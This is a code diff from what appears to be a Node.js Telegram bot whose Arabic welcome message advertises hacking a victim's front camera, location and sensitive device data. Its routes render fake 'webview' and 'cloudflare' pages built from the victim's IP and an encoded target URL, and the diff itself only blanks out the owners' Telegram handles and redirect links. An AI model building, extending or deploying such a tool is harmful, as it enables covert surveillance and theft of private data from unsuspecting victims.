@@ -36,7 +36,7 @@ app.get("/w/:path/:uri", (req, res) => {
     res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
   }
   else {
-    res.redirect("https://t.me/Abu_Yamani");
+    res.redirect("");
   }
 
 
@@ -54,7 +54,7 @@ app.get("/c/:path/:uri", (req, res) => {
     res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
   }
   else {
-    res.redirect("https://t.me/Abu_Yamani");
+    res.redirect("https://");
   }
 
 
@@ -79,7 +79,7 @@ bot.on('message', async (msg) => {
 
     bot.sendMessage(chatId, `اهلابك👨‍💻⚠️ ${msg.chat.first_name} ! , \ في بوت  إختراق الكاميرا الاماميه وموقع الضحيه وبعض المعلومات الحاسسه في جهاز الضحية🥷🏾✅
     للإبلاغ عن مستخدم غير اخلاقي 🔰للتواصل مع المالڪ
-( @king_1_4 ) s.\n\nارسل /help لمعرفة المزيد عن البوت.`, m);
+(  ) s.\n\nارسل /help لمعرفة المزيد عن البوت.`, m);
   }
   else if (msg.text == "/create") {
     createNew(chatId);
@@ -97,12 +97,12 @@ bot.on('message', async (msg) => {
 
 
 🔰للتواصل مع المالڪ
-( @king_1_4 )
+(  )
 
 
 قناتي الرسميه لتحديثات والجميع مطلبات الهاكر
 
-@Abu_Yamani
+
 
 
 "إن الله بما تعملون بصير"
